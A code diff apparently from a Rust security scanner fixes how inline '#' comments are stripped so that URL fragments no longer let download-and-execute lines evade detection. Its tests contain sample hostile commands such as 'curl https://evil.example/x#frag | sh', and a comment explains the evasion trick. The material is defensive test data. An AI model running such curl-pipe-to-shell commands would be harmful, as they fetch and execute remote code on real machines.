@@ -53,8 +53,24 @@ pub(crate) fn sibling_has_file(sibling_files: &[PathBuf], name: &str) -> bool {
 /// `pip.conf`) that also accept `;` as a comment marker. Do NOT use the
 /// INI variant on `requirements.txt` (where `;` is the PEP 508
 /// environment-marker separator, e.g. `requests; python_version>='3.6'`).
+///
+/// A `#` only opens a comment at line start (after leading whitespace) or
+/// when preceded by whitespace. A `#` glued to a preceding non-whitespace
+/// byte is part of a token — e.g. a URL fragment in `curl host/x#frag |
+/// sh` — so splitting on the first `#` unconditionally would drop the real
+/// trailing command and let any download-execute line evade the substring
+/// detectors. This rule holds for `#`-comment shells, Makefile, Dockerfile,
+/// and `requirements.txt` alike.
 pub(crate) fn strip_inline_hash_comment(line: &str) -> &str {
-    line.split_once('#').map(|(code, _)| code).unwrap_or(line)
+    let bytes = line.as_bytes();
+    let mut prev_is_boundary = true;
+    for (idx, &byte) in bytes.iter().enumerate() {
+        if byte == b'#' && prev_is_boundary {
+            return &line[..idx];
+        }
+        prev_is_boundary = byte.is_ascii_whitespace();
+    }
+    line
 }
 
 /// Drop everything from the first INI comment marker (`#` or `;`),
@@ -114,6 +130,24 @@ mod tests {
     fn strip_inline_hash_comment_collapses_pure_comment_to_empty() {
         assert_eq!(strip_inline_hash_comment("# curl evil.example"), "");
         assert_eq!(strip_inline_hash_comment("#bash install.sh"), "");
+    }
+
+    /// Contract: a `#` glued to a preceding non-whitespace byte is part of
+    /// a token (a URL fragment), NOT a comment, so the trailing code is
+    /// preserved. Pre-fix the unconditional first-`#` split dropped
+    /// everything after a URL fragment, letting `curl host/x#frag | sh`
+    /// evade the download-execute detectors.
+    #[test]
+    fn strip_inline_hash_comment_keeps_url_fragment_code() {
+        assert_eq!(
+            strip_inline_hash_comment("curl https://evil.example/x#frag | sh"),
+            "curl https://evil.example/x#frag | sh",
+        );
+        // A real trailing comment after the fragment is still stripped.
+        assert_eq!(
+            strip_inline_hash_comment("curl https://evil.example/x#frag | sh # note"),
+            "curl https://evil.example/x#frag | sh ",
+        );
     }
 
     /// Contract: with neither `#` nor `;`, the line is returned verbatim.
